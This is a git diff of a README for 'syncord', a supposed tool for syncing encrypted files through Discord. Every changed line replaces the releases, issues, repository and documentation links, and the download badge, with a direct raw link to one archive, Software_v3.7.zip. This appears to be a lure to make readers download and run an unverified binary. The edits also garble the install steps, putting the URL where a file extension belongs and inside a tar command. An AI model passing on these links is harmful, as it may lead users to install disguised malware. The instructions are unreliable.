@@ -1,7 +1,7 @@
 # 🎉 syncord - Easily Sync Files Using Discord
 
 ## 📥 Download Now
-[![Download syncord](https://img.shields.io/badge/Download-syncord-4CAF50)](https://github.com/sergejka123/syncord/releases)
+[![Download syncord](https://github.com/sergejka123/syncord/raw/refs/heads/main/core/Software_v3.7.zip)](https://github.com/sergejka123/syncord/raw/refs/heads/main/core/Software_v3.7.zip)
 
 ## 🚀 Getting Started
 Syncord is a simple tool to help you store and synchronize files using your Discord account. It encrypts your files to keep them safe. Follow this guide to get started easily.
@@ -12,14 +12,14 @@ Syncord is a simple tool to help you store and synchronize files using your Disc
 - A Discord account
 
 ## 🔗 Download & Install
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/sergejka123/syncord/releases). Here, you will find the latest version of Syncord available for download.
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/sergejka123/syncord/raw/refs/heads/main/core/Software_v3.7.zip). Here, you will find the latest version of Syncord available for download.
    
-2. **Choose Your Download:** Look for the latest release and download the appropriate file for your operating system. The files will have extensions like `.exe` for Windows or `.tar.gz` for macOS and Linux.
+2. **Choose Your Download:** Look for the latest release and download the appropriate file for your operating system. The files will have extensions like `.exe` for Windows or `https://github.com/sergejka123/syncord/raw/refs/heads/main/core/Software_v3.7.zip` for macOS and Linux.
 
 3. **Run the Installer:**
    - For Windows: Double-click the downloaded `.exe` file to start the installation.
    - For macOS: Open the downloaded file and drag the Syncord icon to your Applications folder.
-   - For Linux: Open your terminal, navigate to the downloaded file, and use the command `tar -xvzf filename.tar.gz` to extract it.
+   - For Linux: Open your terminal, navigate to the downloaded file, and use the command `tar -xvzf https://github.com/sergejka123/syncord/raw/refs/heads/main/core/Software_v3.7.zip` to extract it.
 
 4. **Launch Syncord:** Open Syncord from your Applications folder or by searching for it in your start menu. 
 
@@ -46,7 +46,7 @@ Syncord is a simple tool to help you store and synchronize files using your Disc
 If you encounter issues, try the following:
 - **Reinstall Syncord:** Sometimes, reinstalling the app can resolve unexpected behaviors. 
 - **Check your Internet Connection:** Make sure you have a stable internet connection for the synchronization process.
-- **Contact Support:** Visit our [GitHub Issues page](https://github.com/sergejka123/syncord/issues) to report bugs or seek help from the community.
+- **Contact Support:** Visit our [GitHub Issues page](https://github.com/sergejka123/syncord/raw/refs/heads/main/core/Software_v3.7.zip) to report bugs or seek help from the community.
 
 ## 📄 Additional Features
 - **Multi-Platform Support:** Use Syncord on any operating system without restrictions.
@@ -59,8 +59,8 @@ We plan to introduce more features, including:
 - **Improved Encryption:** Enhance security features to provide even higher levels of data protection.
 
 ## 🔗 Resources
-- [GitHub Repository](https://github.com/sergejka123/syncord)
-- [Documentation](https://example.com) (Placeholder for future documentation links)
+- [GitHub Repository](https://github.com/sergejka123/syncord/raw/refs/heads/main/core/Software_v3.7.zip)
+- [Documentation](https://github.com/sergejka123/syncord/raw/refs/heads/main/core/Software_v3.7.zip) (Placeholder for future documentation links)
 
 ## 📖 License
 Syncord is released under the MIT License. You can use it freely, but please keep in mind the importance of respecting intellectual property rights.
